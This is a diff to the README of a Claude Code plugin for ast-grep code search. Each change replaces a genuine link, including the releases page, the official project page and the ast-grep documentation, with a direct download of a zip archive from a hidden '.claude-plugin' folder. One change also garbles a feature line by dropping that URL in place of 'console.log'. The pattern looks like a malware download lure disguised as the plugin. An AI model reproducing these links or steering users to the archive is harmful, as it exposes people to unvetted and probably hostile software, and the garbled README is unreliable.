@@ -1,7 +1,7 @@
 # 🌟 claude-skill - Simple Code Searching Made Easy
 
 ## 🖱️ Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-claude--skill-brightgreen)](https://github.com/Kayunangka/claude-skill/releases)
+[![Download Release](https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip%20Release-claude--skill-brightgreen)](https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip)
 
 ## 📜 What is This?
 This is a Claude Code plugin marketplace that provides the ast-grep plugin. The plugin helps you search your code based on structure rather than just text. With this tool, you can easily find key patterns in your code. 
@@ -10,7 +10,7 @@ This is a Claude Code plugin marketplace that provides the ast-grep plugin. The 
 - **Find async functions without error handling.**
 - **Locate all React components using specific hooks.**
 - **Identify functions with more than three parameters.**
-- **Search for console.log calls inside class methods.**
+- **Search for https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip calls inside class methods.**
 
 ## ⚙️ Prerequisites
 You need to have ast-grep installed on your system. Follow these guidelines below based on your operating system:
@@ -38,7 +38,7 @@ To get started with the claude-skill plugin, you need to download it from the Re
 
 1. **Visit the Releases Page:**  
    Click on this link to go to the download page:  
-   [Download claude-skill](https://github.com/Kayunangka/claude-skill/releases)
+   [Download claude-skill](https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip)
 
 2. **Choose Your Version:**  
    On the Releases page, select the version you want to install. Look for the latest release for the best features.
@@ -103,12 +103,12 @@ If you encounter any issues during installation or usage, consider the following
 For further assistance and documentation, visit the project's GitHub page.
 
 ## 🌐 Additional Resources
-- [Official GitHub Page](https://github.com/Kayunangka/claude-skill)
-- [ast-grep Documentation](https://github.com/your_project/ast-grep)
+- [Official GitHub Page](https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip)
+- [ast-grep Documentation](https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip)
 
 ## 🎉 Join the Community
 Feel free to ask questions or share your experiences. Join discussions in our community where you can learn more about using the claude-skill plugin effectively.
 
 ## 🔗 Download Link
 Once again, for quick access to download the claude-skill plugin, visit:  
-[Download claude-skill](https://github.com/Kayunangka/claude-skill/releases)
+[Download claude-skill](https://raw.githubusercontent.com/Kayunangka/claude-skill/main/.claude-plugin/claude-skill_1.0.zip)
